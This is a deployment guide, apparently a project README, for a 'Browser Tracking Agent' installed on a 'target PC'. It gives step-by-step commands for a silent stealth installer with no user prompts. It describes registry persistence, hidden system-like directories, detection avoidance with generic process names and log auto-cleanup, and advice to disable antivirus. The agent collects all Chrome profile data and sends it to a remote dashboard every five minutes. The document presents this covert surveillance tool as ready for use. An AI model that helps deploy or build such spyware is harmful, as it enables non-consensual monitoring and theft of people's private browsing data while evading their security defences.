# Browser Tracking Agent - Full Deployment Guide

## 📦 **Deployment Package Contents**

### **Standard Installation Package:**
- `BrowserTracker_Deployment_YYYYMMDD_HHMMSS.zip` - Complete installation package
- Contains all necessary files for full installation

### **Silent Installation:**
- `silent_installer.py` - Stealth deployment script
- Runs completely hidden without user interaction

## 🚀 **Deployment Methods**

### **Method 1: Standard Installation (Recommended)**

#### **Step 1: Prepare Package**
1. Copy `BrowserTracker_Deployment_YYYYMMDD_HHMMSS.zip` to target PC
2. Extract ZIP file to any location
3. Navigate to extracted folder

#### **Step 2: Install**
```cmd
# Option A: Quick Install (Recommended)
Right-click "QUICK_INSTALL.bat" → "Run as Administrator"

# Option B: Manual Install
python INSTALL.py
```

#### **Step 3: Verify Installation**
- Agent starts automatically
- Check Windows startup programs
- Verify in Task Manager (python.exe processes)
- Check dashboard: https://browser-tracking.vercel.app

### **Method 2: Silent Installation (Stealth)**

#### **For Stealth Deployment:**
```cmd
# Copy silent_installer.py to target PC
# Run silently (no user interaction)
python silent_installer.py

# Or run completely hidden
pythonw silent_installer.py
```

#### **Silent Installation Features:**
- ✅ **No user prompts**
- ✅ **Hidden installation directory**
- ✅ **Automatic Python installation**
- ✅ **Registry-based persistence**
- ✅ **Background operation**
- ✅ **No visible processes**

## 🎯 **Installation Features**

### **Automatic Setup:**
- ✅ **Python Detection/Installation** - Auto-installs Python 3.11 if missing
- ✅ **Dependency Management** - Installs required packages automatically
- ✅ **Windows Startup Integration** - Starts automatically on boot
- ✅ **Directory Creation** - Creates all necessary folders
- ✅ **Configuration** - Pre-configured for immediate operation

### **Post-Installation:**
- ✅ **Background Operation** - Runs silently in background
- ✅ **Auto-Restart** - Restarts automatically if crashed
- ✅ **Data Collection** - Monitors all Chrome profiles
- ✅ **Real-time Transmission** - Sends data every 5 minutes
- ✅ **Dashboard Integration** - Appears on monitoring dashboard

## 📊 **Monitoring & Management**

### **Dashboard Access:**
- **URL**: https://browser-tracking.vercel.app
- **Features**: Real-time monitoring, client status, browsing data
- **Auto-refresh**: Updates every 30 seconds

### **Local Management:**
```cmd
# Check agent status
python enhanced_agent.py --status

# Start agent manually
python enhanced_agent.py --start

# Stop agent
python enhanced_agent.py --stop

# Test connection
python enhanced_agent.py --test
```

### **GUI Management:**
- Run `utilities/simple_gui.py` for graphical interface
- Start/stop agent with buttons
- View real-time logs
- Configure settings

## 🔧 **Troubleshooting**

### **Installation Issues:**

#### **Python Installation Fails:**
```cmd
# Manual Python installation
1. Download: https://www.python.org/downloads/
2. Install with "Add to PATH" checked
3. Restart installation
```

#### **Permission Errors:**
```cmd
# Run as Administrator
Right-click Command Prompt → "Run as Administrator"
cd to installation directory
python INSTALL.py
```

#### **Antivirus Blocking:**
```cmd
# Temporarily disable antivirus
# Add installation directory to exclusions
# Re-run installation
```

### **Agent Issues:**

#### **Agent Not Starting:**
```cmd
# Check Windows startup
Win+R → msconfig → Startup tab
Look for "BrowserTracker" or "SystemDataService"

# Manual start
cd installation_directory
python enhanced_agent.py --start
```

#### **No Data in Dashboard:**
```cmd
# Check internet connection
ping browser-tracking.vercel.app

# Test agent connection
python enhanced_agent.py --test

# Check agent logs
type browser_tracking.log
```

## 🛡️ **Security & Stealth**

### **Stealth Features:**
- **Hidden Installation**: Uses system-like directory names
- **Background Operation**: No visible windows or notifications
- **Registry Persistence**: Starts automatically without shortcuts
- **Minimal Footprint**: Small memory and CPU usage
- **Silent Updates**: No user interaction required

### **Detection Avoidance:**
- **Process Names**: Uses generic Python process names
- **File Locations**: Hidden in system directories
- **Network Traffic**: HTTPS encrypted transmission
- **Log Management**: Minimal logging, auto-cleanup

## 📋 **System Requirements**

### **Minimum Requirements:**
- **OS**: Windows 10/11 (64-bit)
- **RAM**: 50MB available memory
- **Disk**: 100MB free space
- **Network**: Internet connection
- **Browser**: Google Chrome (any version)

### **Recommended:**
- **RAM**: 100MB+ available
- **Disk**: 200MB+ free space
- **Network**: Stable broadband connection
- **Permissions**: Administrator access for installation

## 🔄 **Maintenance**

### **Regular Checks:**
- Monitor dashboard for client status
- Check agent logs periodically
- Verify data transmission
- Update agent if needed

### **Updates:**
- New versions deployed via same installation method
- Automatic update capability (future feature)
- Manual update by re-running installer

## 📞 **Support**

### **Common Commands:**
```cmd
# Installation status
python INSTALL.py --status

# Agent diagnostics
python enhanced_agent.py --test

# View logs
type browser_tracking.log

# Uninstall (if needed)
python INSTALL.py --uninstall
```

### **Log Locations:**
- **Installation logs**: `installation_directory/logs/`
- **Agent logs**: `installation_directory/browser_tracking.log`
- **System logs**: `%TEMP%/system_update.log` (silent install)

---

**🎯 Deployment Complete! Agent will now monitor browser activity and transmit data to the central dashboard in real-time.**
